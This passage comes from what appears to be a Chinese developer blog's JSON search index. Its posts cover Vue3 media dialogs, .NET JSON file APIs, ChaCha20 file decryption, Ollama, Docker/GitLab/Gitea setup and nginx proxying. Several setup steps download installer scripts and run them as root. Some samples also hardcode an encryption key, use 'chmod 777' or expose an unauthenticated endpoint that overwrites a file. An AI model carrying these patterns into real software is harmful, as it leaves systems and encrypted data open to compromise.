ElMessage.error(\u0026#39;音频播放失败\u0026#39;); }; } function playMP4(source) { mediaSource.value = source; dialogVisible.value = true; } function handleDialogClose() { dialogVisible.value = false; playingRowId.value = null; // Reset when the dialog is closed } \u0026lt;/script\u0026gt; 设置媒体源（mediaSource）：确保在打开对话框之前，视频的来源（mediaSource.value）已正确设置为MP4的URL。 设置对话框可见性（dialogVisible）：必须将dialogVisible.value设置为true，以确保对话框能够打开。 **视频元素：**视频元素的src属性应绑定到mediaSource，并且该元素应在el-dialog组件中可见。\n弹窗注意引入 Element Plus v-model=\u0026ldquo;dialogVisible\u0026rdquo;\nconsole.log(\u0026lsquo;Dialog visible:\u0026rsquo;, dialogVisible.value); // true console.log(\u0026lsquo;Video source:\u0026rsquo;, mediaSource.value); // MP4 URL\n图片显示 使用 Element Plus 提供的 el-image-viewer 组件。这个组件允许你点击图片时显示大图，带有放大、缩小、旋转等功能\n\u0026lt;!-- 缩略图 --\u0026gt; \u0026lt;el-image style=\u0026#34;width: 80px; height: 80px\u0026#34; :src=\u0026#34;scope.row.ContentT2\u0026#34; @click=\u0026#34;handleImageClick(scope.row.ContentT2)\u0026#34; \u0026gt; \u0026lt;template #error\u0026gt; ERR \u0026lt;/template\u0026gt; \u0026lt;/el-image\u0026gt; \u0026lt;!-- 大图查看器 --\u0026gt; \u0026lt;el-dialog :visible.sync=\u0026#34;dialogVisible\u0026#34; width=\u0026#34;80%\u0026#34; center @close=\u0026#34;closeDialog\u0026#34; append-to-body\u0026gt; \u0026lt;el-image-viewer :url-list=\u0026#34;urlList\u0026#34; :initial-index=\u0026#34;0\u0026#34; @close=\u0026#34;closeDialog\u0026#34; v-if=\u0026#34;dialogVisible\u0026#34; /\u0026gt; \u0026lt;/el-dialog\u0026gt; JS代码\n\u0026lt;script setup\u0026gt; import { ref } from \u0026#39;vue\u0026#39;; const dialogVisible = ref(false); // 控制对话框是否可见 const urlList = ref([]); // 图片列表 // 点击图片时触发，打开图片查看器 function handleImageClick(imageUrl) { urlList.value = [imageUrl]; // 设置图片 URL 列表 dialogVisible.value = true; // 打开对话框 } // 关闭对话框 function closeDialog() { dialogVisible.value = false; // 关闭对话框 } \u0026lt;/script\u0026gt; 也可以使用 el-image 简单展示 \u0026lt;!-- 大图展示 --\u0026gt; \u0026lt;el-dialog :visible.sync=\u0026quot;dialogVisible\u0026quot; width=\u0026quot;50%\u0026quot; center @close=\u0026quot;closeDialog\u0026quot; append-to-body\u0026gt; \u0026lt;el-image :src=\u0026quot;currentImage\u0026quot; style=\u0026quot;width: 100%;\u0026quot; /\u0026gt; \u0026lt;/el-dialog\u0026gt; 取消播放结束关闭 @ended=\u0026ldquo;handleDialogClose\u0026rdquo;\n","permalink":"https://qfsyso.github.io/posts/vue3-dialog-play-aac-mp4/","summary":"vue3 play acc mp4 show png\n\u0026lt;template\u0026gt; \u0026lt;div v-if=\u0026#34;scope.row.MsgType == 7 || scope.row.MsgType == 19\u0026#34;\u0026gt; \u0026lt;el-button :type=\u0026#34;playingRowId === scope.row.AutoID ? \u0026#39;warning\u0026#39; : \u0026#39;info\u0026#39;\u0026#34; :disabled=\u0026#34;playingRowId === scope.row.AutoID\u0026#34; @click=\u0026#34;handleD(scope.row.Content, scope.row.MsgType, scope.row.UserID, scope.row.AutoID)\u0026#34; \u0026gt; {{ playingRowId === scope.row.AutoID ? \u0026#39;播放中\u0026#39; : \u0026#39;播放\u0026#39; }} \u0026lt;/el-button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;!-- MP4 Dialog --\u0026gt; \u0026lt;el-dialog :visible.sync=\u0026#34;dialogVisible\u0026#34; width=\u0026#34;80%\u0026#34; center @close=\u0026#34;handleDialogClose\u0026#34;\u0026gt; \u0026lt;video ref=\u0026#34;videoPlayer\u0026#34; controls autoplay @ended=\u0026#34;handleDialogClose\u0026#34; :src=\u0026#34;mediaSource\u0026#34; style=\u0026#34;width: 100%;\u0026#34; \u0026gt;\u0026lt;/video\u0026gt; \u0026lt;/el-dialog\u0026gt; \u0026lt;/template\u0026gt; JS代码\n\u0026lt;script setup\u0026gt; import { ref } from \u0026#39;vue\u0026#39;; import { ElMessage } from \u0026#39;element-plus\u0026#39;; import request from \u0026#39;@/api/request\u0026#39;; // Assuming you use Axios or similar const playingRowId = ref(null); // Tracks the AutoID of the row currently being played const dialogVisible = ref(false); const mediaSource = ref(\u0026#39;\u0026#39;); async function handleD(com, msgt, userid, autoid) { try { // Set the current row\u0026#39;s AutoID as the playing row playingRowId.","title":"vue3 dialog play aac mp4"},{"content":"1. 创建一个新的控制器 在Controllers文件夹中创建一个新控制器，例如JsonController.cs。\nusing Microsoft.AspNetCore.Mvc; using System.IO; using Newtonsoft.Json; namespace Namespace.Controllers { [ApiController] [Route(\u0026#34;[controller]\u0026#34;)] public class JsonController : ControllerBase { private readonly string _jsonFilePath = Path.Combine(Directory.GetCurrentDirectory(), \u0026#34;wwwroot\u0026#34;, \u0026#34;data.json\u0026#34;); // GET: /json [HttpGet] public IActionResult GetJson() { if (!System.IO.File.Exists(_jsonFilePath)) return NotFound(\u0026#34;JSON file not found.\u0026#34;); var jsonContent = System.IO.File.ReadAllText(_jsonFilePath); return Content(jsonContent, \u0026#34;application/json\u0026#34;); } // POST: /json [HttpPost] public IActionResult PostJson([FromBody] DataType data) { var jsonString = JsonConvert.SerializeObject(data); System.IO.File.WriteAllText(_jsonFilePath, jsonString); return Ok(\u0026#34;JSON file updated successfully.\u0026#34;); } } public class DataType { // Define JSON structure here public string Name { get; set; } public int Age { get; set; } } } 2. 添加依赖项 package 确保已经安装了Newtonsoft.Json包\ndotnet add package Newtonsoft.Json 3.配置文件路径 在上述代码中，我们将JSON文件的路径设置为wwwroot/data.json\n4. 运行项目 启动ASP.NET Core应用程序，并使用工具如Postman或浏览器测试API端点。\nGET请求：http://localhost:5000/json\nPOST请求：使用类似以下的JSON数据发送一个POST请求到http://localhost:5000/json：\n{ \u0026#34;name\u0026#34;: \u0026#34;lll\u0026#34;, \u0026#34;age\u0026#34;: 30 } DataType class也可以嵌套多层 根据实际应用来编写\n","permalink":"https://qfsyso.github.io/posts/.net-write-wwwroot-json/","summary":"1. 创建一个新的控制器 在Controllers文件夹中创建一个新控制器，例如JsonController.cs。\nusing Microsoft.AspNetCore.Mvc; using System.IO; using Newtonsoft.Json; namespace Namespace.Controllers { [ApiController] [Route(\u0026#34;[controller]\u0026#34;)] public class JsonController : ControllerBase { private readonly string _jsonFilePath = Path.Combine(Directory.GetCurrentDirectory(), \u0026#34;wwwroot\u0026#34;, \u0026#34;data.json\u0026#34;); // GET: /json [HttpGet] public IActionResult GetJson() { if (!System.IO.File.Exists(_jsonFilePath)) return NotFound(\u0026#34;JSON file not found.\u0026#34;); var jsonContent = System.IO.File.ReadAllText(_jsonFilePath); return Content(jsonContent, \u0026#34;application/json\u0026#34;); } // POST: /json [HttpPost] public IActionResult PostJson([FromBody] DataType data) { var jsonString = JsonConvert.SerializeObject(data); System.IO.File.WriteAllText(_jsonFilePath, jsonString); return Ok(\u0026#34;JSON file updated successfully.","title":" .net write wwwroot json"},{"content":".NET 实现 ChaCha20 加密和解密\nadd package Install-Package BouncyCastle chacha20 helper using Org.BouncyCastle.Crypto; using Org.BouncyCastle.Crypto.Engines; using Org.BouncyCastle.Crypto.Parameters; using System; public class ChaCha20 { private readonly byte[] key; private readonly byte[] nonce; // Constructor to initialize key and nonce public ChaCha20(byte[] key, byte[] nonce) { if (key.Length != 32) { throw new ArgumentException(\u0026#34;Key must be 32 bytes (256 bits).\u0026#34;); } if (nonce.Length != 12) { throw new ArgumentException(\u0026#34;Nonce must be 12 bytes (96 bits).\u0026#34;); } this.key = key; this.nonce = nonce; } // Method to encrypt the data using ChaCha20 public byte[] Encrypt(byte[] data, int offset, int count) { return ProcessData(true, data, offset, count); } // Method to decrypt the data using ChaCha20 public byte[] Decrypt(byte[] data, int offset, int count) { return ProcessData(false, data, offset, count); } // Helper method to process encryption/decryption private byte[] ProcessData(bool forEncryption, byte[] data, int offset, int count) { var engine = new ChaCha7539Engine(); // ChaCha20/Poly1305 engine (ChaCha7539) var parameters = new ParametersWithIV(new KeyParameter(key), nonce); engine.Init(forEncryption, parameters); byte[] output = new byte[count]; engine.ProcessBytes(data, offset, count, output, 0); return output; } } 关键点解释： ChaCha7539Engine:\nBouncyCastle 提供了 ChaCha7539Engine，这是 ChaCha20 加密算法的实现（96-bit nonce，32-byte key）。 ProcessData:\nProcessData 方法负责执行加密和解密，取决于传入的 forEncryption 参数。 加密时，forEncryption 为 true，否则为 false。 Key 和 Nonce:\nChaCha20 使用 32 字节（256 位）的密钥和 12 字节（96 位）的 nonce。 如果传入的密钥或 nonce 不符合长度要求，会抛出 ArgumentException。 Encrypt 和 Decrypt:\nEncrypt 和 Decrypt 调用 ProcessData 来执行加解密，分别用于加密和解密数据。 调用示例：\npublic class Program { public static void Main() { // 示例密钥和 nonce byte[] key = new byte[32] { 0x1E, 0x12, 0x0B, 0x02, 0x05, 0x18, 0x01, 0x13, 0x10, 0x0D, 0x04, 0x06, 0x07, 0x19, 0x09, 0x15, 0x0F, 0x17, 0x08, 0x00, 0x1A, 0x16, 0x1D, 0x14, 0x0E, 0x03, 0x1B, 0x1C, 0x11, 0x0C, 0x1E, 0x1F }; byte[] nonce = new byte[12] { 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B }; // 要加密的示例数据 byte[] plainText = System.Text.Encoding.UTF8.GetBytes(\u0026#34;Hello, ChaCha20 encryption!\u0026#34;); // 加密 ChaCha20 chacha20 = new ChaCha20(key, nonce); byte[] cipherText = chacha20.Encrypt(plainText, 0, plainText.Length); Console.WriteLine(\u0026#34;Encrypted: \u0026#34; + BitConverter.ToString(cipherText)); // 解密 byte[] decryptedText = chacha20.Decrypt(cipherText, 0, cipherText.Length); Console.WriteLine(\u0026#34;Decrypted: \u0026#34; + System.Text.Encoding.UTF8.GetString(decryptedText)); } } 输出：\nEncrypted: \u0026lt;加密的十六进制字节串\u0026gt; Decrypted: Hello, ChaCha20 encryption! 通过CHACHA2加解密文件 public class FileEncryptorHelper { // 生成随机的 Nonce（12字节） private byte[] GenerateRandomNonce() { byte[] nonce = new byte[12]; // 12字节的Nonce using (var rng = RandomNumberGenerator.Create()) { rng.GetBytes(nonce); } return nonce; } // 生成固定的 Key（32字节） private byte[] GenerateKey() { // 使用固定的 256 位（32 字节）的密钥 return new byte[] { 0x1E, 0x12, 0x0B, 0x02, 0x05, 0x18, 0x01, 0x13, 0x10, 0x0D, 0x04, 0x06, 0x07, 0x19, 0x09, 0x15, 0x0F, 0x17, 0x08, 0x00, 0x1A, 0x16, 0x1D, 0x14, 0x0E, 0x03, 0x1B, 0x1C, 0x11, 0x0C, 0x1E, 0x1F }; } // 加密文件 每4096 public void EncryptFile(string inputPath, string outputPath, int blockSize = 4096) { byte[] nonce = GenerateRandomNonce(); byte[] key = GenerateKey(); EncryptFile(inputPath, outputPath, key, nonce, blockSize); } // 使用随机生成的 Nonce 和固定的 Key 进行 ChaCha20 加密 public void EncryptFile(string inputPath, string outputPath, byte[] key, byte[] nonce, int blockSize) { if (!File.Exists(outputPath)) { File.Create(outputPath).Dispose(); } using (var inputFile = File.OpenRead(inputPath)) using (var outputFile = File.OpenWrite(outputPath)) { // 将 nonce 写入输出文件的开头 outputFile.Write(nonce, 0, nonce.Length); using (var chacha20 = new MyCC20(key, nonce)) { byte[] buffer = new byte[blockSize]; int bytesRead; // 逐块读取文件内容并加密 while ((bytesRead = inputFile.Read(buffer, 0, blockSize)) \u0026gt; 0) { byte[] encryptedData = chacha20.EncryptBytes(buffer, bytesRead); outputFile.Write(encryptedData, 0, encryptedData.Length); } } } Console.WriteLine(\u0026#34;File encrypted successfully: \u0026#34; + outputPath); } // 解密文件 public void DecryptFile(string inputPath, string outputPath, int blockSize = 4096) { if (!File.Exists(outputPath)) { File.Create(outputPath).Dispose(); } using (var inputFile = File.OpenRead(inputPath)) using (var outputFile = File.OpenWrite(outputPath)) { // 从输入文件的开头读取 nonce byte[] nonce = new byte[12]; int nonceRead = inputFile.Read(nonce, 0, nonce.Length); if (nonceRead != 12) throw new Exception(\u0026#34;Invalid nonce\u0026#34;); byte[] key = GenerateKey(); using (var chacha20 = new MyCC20(key, nonce)) { byte[] buffer = new byte[blockSize]; int bytesRead; // 逐块读取文件内容并解密 while ((bytesRead = inputFile.Read(buffer, 0, blockSize)) \u0026gt; 0) { byte[] decryptedData = chacha20.DecryptBytes(buffer, bytesRead); outputFile.Write(decryptedData, 0, decryptedData.Length); } } } Console.WriteLine(\u0026#34;File decrypted successfully: \u0026#34; + outputPath); } } 调用\ntry { // 创建 FileEncryptorHelper 对象 FileEncryptorHelper fileEncryptor = new FileEncryptorHelper(); // 指定加密文件路径和解密后的输出文件路径 string encryptedFilePath = \u0026#34;13632AE2-354E-45B8-9BBA-D474005B5DBC.data\u0026#34;; // 加密文件路径 \u0026#34;http://8xxx4:8080/group1/110/13632AE2-354E-45B8-9BBA-D474005B5DBC.data\u0026#34;;// string decryptedFilePath = \u0026#34;decryptedFile3.png\u0026#34;; // 解密后的文件路径 // 调用解密方法 fileEncryptor.DecryptFile(encryptedFilePath, decryptedFilePath); Console.WriteLine(\u0026#34;文件解密成功！\u0026#34;); } catch (Exception ex) { Console.WriteLine(\u0026#34;文件解密失败: \u0026#34; + ex.Message); } 输出\n{\u0026#34;5\u0026#34;:\u0026#34;\\/group1\\/110\\/13632AE2-354E-45B8-9BBA-D474005B5DBC.data\u0026#34;} Str5 : /group1/110/13632AE2-354E-45B8-9BBA-D474005B5DBC.data File decrypted successfully: decryptedFile3.png 文件解密成功！ 同理解密音频文件\nxxx93EC685A2D41.data File decrypted successfully: decryptedFileaac.aac 文件解密成功！ mp4视频同理\n","permalink":"https://qfsyso.github.io/posts/.net-chacha20-decrypted/","summary":".NET 实现 ChaCha20 加密和解密\nadd package Install-Package BouncyCastle chacha20 helper using Org.BouncyCastle.Crypto; using Org.BouncyCastle.Crypto.Engines; using Org.BouncyCastle.Crypto.Parameters; using System; public class ChaCha20 { private readonly byte[] key; private readonly byte[] nonce; // Constructor to initialize key and nonce public ChaCha20(byte[] key, byte[] nonce) { if (key.Length != 32) { throw new ArgumentException(\u0026#34;Key must be 32 bytes (256 bits).\u0026#34;); } if (nonce.Length != 12) { throw new ArgumentException(\u0026#34;Nonce must be 12 bytes (96 bits).","title":" .net chacha20 decrypted"},{"content":"ollama ollama --version 比较常用的指令不多，也很简单 列出本地下载的模型\nollama list 查看正在运行的模型\nollama ps 模型标识下载模型到本地\nollama pull 比如我要下载llama2-chinese:7b则使用\nollama pull llama2-chinese:7b 模型标识运行模型，如果已下载则直接运行，如果没下载则先下载再运行。\nollama run 比如我要运行llama2-chinese:7b可以直接运行\nollama run llama2-chinese:7b .net package dotnet add package Ollama --version 1.9.0 //模型名称是必须要传递的，默认 流式输出,如果想一次返回同样的是设置stream为false。 string modelName = \u0026#34;llama2-chinese:7b\u0026#34;; using var ollama = new OllamaApiClient(baseUri: new Uri(\u0026#34;http://127.0.0.1:11434/api\u0026#34;)); Console.WriteLine(\u0026#34;begin~~~\u0026#34;); string userInput = \u0026#34;\u0026#34;; do { Console.WriteLine(\u0026#34;User:\u0026#34;); userInput = Console.ReadLine()!; var enumerable = ollama.Completions.GenerateCompletionAsync(modelName, userInput); Console.WriteLine(\u0026#34;Agent:\u0026#34;); await foreach (var response in enumerable) { Console.Write($\u0026#34;{response.Response}\u0026#34;); } Console.WriteLine(); } while (!string.Equals(userInput, \u0026#34;exit\u0026#34;, StringComparison.OrdinalIgnoreCase)); Console.WriteLine(\u0026#34;end~~~\u0026#34;); ","permalink":"https://qfsyso.github.io/posts/.net-local-llm/","summary":"ollama ollama --version 比较常用的指令不多，也很简单 列出本地下载的模型\nollama list 查看正在运行的模型\nollama ps 模型标识下载模型到本地\nollama pull 比如我要下载llama2-chinese:7b则使用\nollama pull llama2-chinese:7b 模型标识运行模型，如果已下载则直接运行，如果没下载则先下载再运行。\nollama run 比如我要运行llama2-chinese:7b可以直接运行\nollama run llama2-chinese:7b .net package dotnet add package Ollama --version 1.9.0 //模型名称是必须要传递的，默认 流式输出,如果想一次返回同样的是设置stream为false。 string modelName = \u0026#34;llama2-chinese:7b\u0026#34;; using var ollama = new OllamaApiClient(baseUri: new Uri(\u0026#34;http://127.0.0.1:11434/api\u0026#34;)); Console.WriteLine(\u0026#34;begin~~~\u0026#34;); string userInput = \u0026#34;\u0026#34;; do { Console.WriteLine(\u0026#34;User:\u0026#34;); userInput = Console.ReadLine()!; var enumerable = ollama.Completions.GenerateCompletionAsync(modelName, userInput); Console.WriteLine(\u0026#34;Agent:\u0026#34;); await foreach (var response in enumerable) { Console.","title":".net local LLM"},{"content":"使用docker部署私有化代码管理~\ndocker curl -fsSL https://get.docker.com -o get-docker.sh sudo sh get-docker.sh 国内docker 更新系统包索引\nsudo apt update 安装一些必要的包，以便于后续添加 apt 仓库：\nsudo apt install -y apt-transport-https ca-certificates curl gnupg2 software-properties-common 添加阿里云密钥 添加 GPG 密钥是为了确保软件包的安全性和完整性，避免安装过程中的潜在问题。建议尽量执行这一步，以确保安装过程顺利进行。\ncurl -fsSL https://mirrors.aliyun.com/docker-ce/linux/debian/gpg | sudo apt-key add - 设置阿里云docker仓库\nsudo add-apt-repository \u0026#34;deb [arch=amd64] https://mirrors.aliyun.com/docker-ce/linux/debian $(lsb_release -cs) stable\u0026#34; 再次更新下系统包的索引\nsudo apt update 安装docker\nsudo apt install -y docker-ce 启动并设置docker的开机自启动\nsudo systemctl start docker sudo systemctl enable docker 查看下docker是否安装成功\nsudo docker version 最后配置docker的镜像加速推荐阿里云的网址 https://cr.console.aliyun.com/us-west-1/instances/mirrors\ngitlab docker run --name \u0026#34;my-gitlab\u0026#34; \\ --hostname \u0026#34;my-gitlab\u0026#34; \\ -p 80:80 \\ --restart unless-stopped \\ -d gitlab/gitlab-ce:latest 默认用户名: root 默认密码: 5iveL!fe\ndocker exec -it my-gitlab bash cat /etc/gitlab/initial_root_password Password: 5iveL!fe 修改默认密码 首次登录 GitLab 后，建议立即更改默认密码。可以通过以下步骤进行：\n登录 GitLab Web 界面，使用 root 作为用户名和默认密码。 登录后，点击右上角的头像，选择 Settings。 在 User Settings 页面，选择 Password。 输入当前密码和新密码，然后点击 Save password。 通过这些步骤，你可以安全地管理 GitLab 的默认账号和密码，确保系统的安全性和稳定性。\n用户名：m 密码：xxx\nURL:http://xxx:9090/\ngit命令\n# input user pwd git clone http://xxx/dev/xx.git git config –global user.email git config –global user.name #添加到暂存区 git add . #推送，提交更改 git commit -m “这是一个测试文件” #推送更改到gitlab git push Gitea docker pull gitea/gitea:latest mkdir -p /var/lib/gitea docker run -d --name=gitea -p 10022:22 -p 80:3000 -v /var/lib/gitea:/data gitea/gitea:latest 访问80 完成初始化\n初始化完即可使用\nTag 拉取最新代码（避免冲突） git pull origin main # 如果默认分支是 main # 或者 git pull origin master # 如果默认分支是 master 创建 tag git tag v1.0.0 这里的 v1.0.0 就是 tag 名称，你可以改成需要的版本号或标记。\n如果需要加说明信息，可以用：\ngit tag -a v1.0.0 -m \u0026#34;版本 1.0.0 发布说明\u0026#34; 推送单个 tag 到 GitLab git push origin v1.0.0 一次性推送所有本地 tag git push origin --tags 查看本地和远程 tag git tag # 查看本地 tag git ls-remote --tags origin # 查看远程仓库 tag ⚠️ 注意事项：\n如果需要修改或删除远程 tag，可以用：\ngit tag -d v1.0.0 # 删除本地 tag git push origin :refs/tags/v1.0.0 # 删除远程 tag Gitea 部署指南总结 1. Gitea 简介 轻量级开源代码托管平台：基于 Go 语言开发，支持 Git 版本控制 定位：类似 GitHub/GitLab，但更注重轻量化、低资源占用和快速部署 适用场景：个人开发者、小团队或企业内部使用 名称由来：Git（版本控制）+ Tea（象征轻量/简洁） 2. 核心优势 🚀 轻量高效：低资源占用（最低 2核2G） 🌐 跨平台：支持 Linux/Windows/macOS 🆓 开源免费：社区驱动开发，更新频繁 🐳 快速部署：支持 Docker 一键部署 3. 部署步骤（Linux 环境） 环境准备 系统要求：Ubuntu 20.04，2核2G内存 依赖工具： Docker、Git、MySQL/PostgreSQL/SQLite（推荐 MySQL） 部署流程 安装 Docker 镜像\ndocker pull gitea/gitea docker run -p 3000:3000 -d gitea/gitea 准备环境\n创建数据库： CREATE DATABASE gitea; 创建存储目录： docker exec -it [容器ID] /bin/bash mkdir /opt/gitea \u0026amp;\u0026amp; chmod 777 /opt/gitea 配置 Gitea 访问 http://\u0026lt;服务器IP\u0026gt;:3000 进行配置：\n数据库类型：SQLite3（默认）或 MySQL 应用 URL：设置最终访问地址（如 http://your-domain.com:3000） 创建管理员账户 4. 常见问题 目录权限问题：确保 /var/lib/gitea 目录归属 gitea 用户 端口冲突：修改 app.ini 中的 HTTP_PORT 更换端口 数据库连接：确保 MySQL 远程连接权限已开启 5. 参考文档 Gitea 官方安装文档\nGitea vs GitLab GitLab 和 Gitea 都是常见的 自建 Git 代码托管平台，但定位和功能有些差异。下面我整理一个对比：\n1. 定位与规模 GitLab\n企业级代码托管和 DevOps 平台。\n功能覆盖 代码托管、CI/CD、项目管理、容器仓库、监控、运维 等，属于一站式 DevOps 解决方案。\n更适合中大型团队、企业级开发。\nGitea\n轻量级 Git 服务，主打 简单、轻便、易部署。\n功能以 代码托管 + 基本协作（Issue、PR、Wiki、CI 接口支持）为主。\n更适合小团队、个人开发者，或对资源消耗敏感的场景。\n2. 技术架构 GitLab\n主要用 Ruby + Go + Vue 开发。\n部署体积大（内存 2GB+ 起步，推荐 4GB+）。\n提供 Omnibus 包 一键安装，但升级可能比较“重”。\nGitea\n用 Go 语言 开发，单一二进制文件，跨平台。\n部署极其轻量（几十 MB 的二进制文件，内存占用 \u0026lt; 300MB）。\n安装和升级都很容易。\n3. 功能对比 功能 GitLab Gitea 代码托管 ✔️ ✔️ Issue / PR / Wiki ✔️ ✔️ 权限控制 细粒度（组、子组、项目级别） 基础角色（管理员、开发者、阅读者） CI/CD 内置 GitLab CI（功能强大） 无内置，支持对接 Drone、Jenkins 等 容器镜像仓库 ✔️ 内置 ❌（可额外接入 Harbor 等） 监控与统计 ✔️ 有仪表盘、代码质量分析 ❌（仅基础统计） 扩展性 丰富 API、Webhooks、插件 API + Webhooks，生态较小 企业功能 LDAP、SAML、审计、合规、安全扫描 基础 LDAP/OAuth 支持，无安全扫描 4. 性能与资源消耗 GitLab：功能全但“吃资源”，适合服务器配置较高的环境。\nGitea：轻量快速，能在 树莓派、低配 VPS 上跑，非常适合个人或小型团队。\n5. 社区与生态 GitLab\n商业化程度高（分为社区版和企业版）。\n功能更新快，生态丰富。\n但社区版和企业版差距较大，一些功能需要付费。\nGitea\n社区驱动（从 Gogs 分叉而来）。\n发展很快，但功能覆盖面不如 GitLab。\n完全开源，无商业版。\n6. 典型使用场景 选择 GitLab：\n公司/团队需要完整的 DevOps 流程（代码托管 + CI/CD + 容器 + 安全扫描）。\n团队规模大，需要复杂的权限和管理功能。\n不怕占用服务器资源。\n选择 Gitea：\n个人项目、小团队代码托管。\n对资源占用敏感（低配 VPS、NAS、自建服务器）。\n已有独立的 CI/CD、容器仓库，不需要 GitLab 那么重的功能。\n总结： 如果要做 企业级一站式 DevOps，选 GitLab。\n如果要做 轻量的 Git 服务，只需代码托管和简单协作，选 Gitea。\n","permalink":"https://qfsyso.github.io/posts/debian-docker-gitlab-gitea/","summary":"使用docker部署私有化代码管理~\ndocker curl -fsSL https://get.docker.com -o get-docker.sh sudo sh get-docker.sh 国内docker 更新系统包索引\nsudo apt update 安装一些必要的包，以便于后续添加 apt 仓库：\nsudo apt install -y apt-transport-https ca-certificates curl gnupg2 software-properties-common 添加阿里云密钥 添加 GPG 密钥是为了确保软件包的安全性和完整性，避免安装过程中的潜在问题。建议尽量执行这一步，以确保安装过程顺利进行。\ncurl -fsSL https://mirrors.aliyun.com/docker-ce/linux/debian/gpg | sudo apt-key add - 设置阿里云docker仓库\nsudo add-apt-repository \u0026#34;deb [arch=amd64] https://mirrors.aliyun.com/docker-ce/linux/debian $(lsb_release -cs) stable\u0026#34; 再次更新下系统包的索引\nsudo apt update 安装docker\nsudo apt install -y docker-ce 启动并设置docker的开机自启动\nsudo systemctl start docker sudo systemctl enable docker 查看下docker是否安装成功\nsudo docker version 最后配置docker的镜像加速推荐阿里云的网址 https://cr.","title":"debian docker gitlab gitea"},{"content":"安装了 Nginx sudo apt update sudo apt install nginx node curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash - sudo apt-get install -y nodejs node -v npm -v //testwebside const http = require(\u0026#39;http\u0026#39;); const hostname = \u0026#39;0.0.0.0\u0026#39;; //127001 const port = 8080; const server = http.createServer((req, res) =\u0026gt; { res.statusCode = 200; res.setHeader(\u0026#39;Content-Type\u0026#39;, \u0026#39;text/plain\u0026#39;); res.end(\u0026#39;Hello World 8080 \\n\u0026#39;); }); server.listen(port, hostname, () =\u0026gt; { console.log(`Server running at http://${hostname}:${port}/`); }); 9090 const port = 9090;\n# pm2 node npm install pm2 -g nohup node n80.js \u0026gt; n80.log 2\u0026gt;\u0026amp;1 \u0026amp; nohup node n90.js \u0026gt; n90.log 2\u0026gt;\u0026amp;1 \u0026amp; 或 pm2\n配置 Node.js 应用 假设你有两个 Node.js 应用，分别监听在端口 8080（n80.js） 和 9090（n90.js）。\n确保 Node.js 应用已经启动并分别监听这两个端口。你可以用 pm2 或 forever 来管理 Node.js 应用的启动。\n例如，使用 pm2 启动应用：\npm2 start n80.js --name n80-app pm2 start n90.js --name n90-app Nginx 配置 编辑或创建你自己的 Nginx 配置文件，通常在 /etc/nginx/sites-available/ 下。\n配置示例： 你需要为两个不同的域名（或子域名）配置两个 server 块。\nsudo nano /etc/nginx/sites-available/my-apps Nginx 配置文件：\n配置第一个域名 w1.xxx.com 绑定到端口 8080 server { listen 80; server_name w1.xxx.com; location / { proxy_pass http://127.0.0.1:8080; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; } } 配置第二个域名 w2.xxx.com 绑定到端口 9090 server { listen 80; server_name w2.xxx.com; location / { proxy_pass http://127.0.0.1:9090; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; } } 这个配置文件将使 w1.xxx.com 指向第一个应用（监听端口 8080 的 n80.js），而 w2.xxx.com 指向第二个应用（监听端口 9090 的 n90.js）。\n启用 Nginx 配置 将配置文件链接到 sites-enabled 目录并重启 Nginx：\nsudo ln -s /etc/nginx/sites-available/my-apps /etc/nginx/sites-enabled/ sudo nginx -t # 测试配置文件是否正确 sudo systemctl restart nginx # 重启 Nginx DNS 配置 / 域名解析 确保你已经将 w1.xxx.com 和 w2.xxx.com 的 DNS 配置指向服务器的 IP 地址。\n测试 访问 w1.xxx.com == n80.js\nHello World 8080\n而访问w2.xxx.com == n90.js。\nHello World 9090\nNginx 日志：\ntail -f /var/log/nginx/error.log ","permalink":"https://qfsyso.github.io/posts/nginx-domain-4-nodeserver/","summary":"安装了 Nginx sudo apt update sudo apt install nginx node curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash - sudo apt-get install -y nodejs node -v npm -v //testwebside const http = require(\u0026#39;http\u0026#39;); const hostname = \u0026#39;0.0.0.0\u0026#39;; //127001 const port = 8080; const server = http.createServer((req, res) =\u0026gt; { res.statusCode = 200; res.setHeader(\u0026#39;Content-Type\u0026#39;, \u0026#39;text/plain\u0026#39;); res.end(\u0026#39;Hello World 8080 \\n\u0026#39;); }); server.listen(port, hostname, () =\u0026gt; { console.log(`Server running at http://${hostname}:${port}/`); }); 9090 const port = 9090;","title":" nginx domain 4 nodeserver"},{"content":"在项目中使用 dotnet publish 命令来发布应用程序。\n将发布的应用程序文件夹复制到 Linux 服务器上。\n在 Linux 服务器上安装 .NET 运行时，如果应用是 self-contained（独立部署）的。\n使用 systemd 创建一个服务单元文件来管理应用作为服务运行。\n启动应用程序服务。\n发布应用程序：\ndotnet publish -c Release -o ./publish 将发布文件夹复制到 Linux 服务器：\nscp -r ./publish [user]@[host]:/var/www/myapp 运行\ndotnet myapp.dll 创建 systemd 服务文件 /etc/systemd/system/myapp.service：\n[Unit] Description=My .NET App [Service] WorkingDirectory=/var/www/myapp ExecStart=/var/www/myapp/MyApp Restart=always RestartSec=10 SyslogIdentifier=dotnet-myapp User=www-data Environment=ASPNETCORE_ENVIRONMENT=Production [Install] WantedBy=multi-user.target 启动服务：\nsudo systemctl enable myapp.service sudo systemctl start myapp.service 确保应用程序配置了正确的端口监听和防火墙规则。\n++++++++++++++++++\u0026ndash;\napi wr wwwroot json\nusing Microsoft.AspNetCore.Mvc; using System.IO; using Newtonsoft.Json; namespace MNamespace.Controllers { [ApiController] [Route(\u0026#34;[controller]\u0026#34;)] public class JsonController : ControllerBase { //wwwroot/data.json private readonly string _jsonFilePath = Path.Combine(Directory.GetCurrentDirectory(), \u0026#34;wwwroot\u0026#34;, \u0026#34;data.json\u0026#34;); // GET: /json [HttpGet] public IActionResult GetJson() { if (!System.IO.File.Exists(_jsonFilePath)) return NotFound(\u0026#34;JSON file not found.\u0026#34;); var jsonContent = System.IO.File.ReadAllText(_jsonFilePath); return Content(jsonContent, \u0026#34;application/json\u0026#34;); } // POST: /json [HttpPost] public IActionResult PostJson([FromBody] MDataType data) { var jsonString = JsonConvert.SerializeObject(data); System.IO.File.WriteAllText(_jsonFilePath, jsonString); return Ok(\u0026#34;JSON file 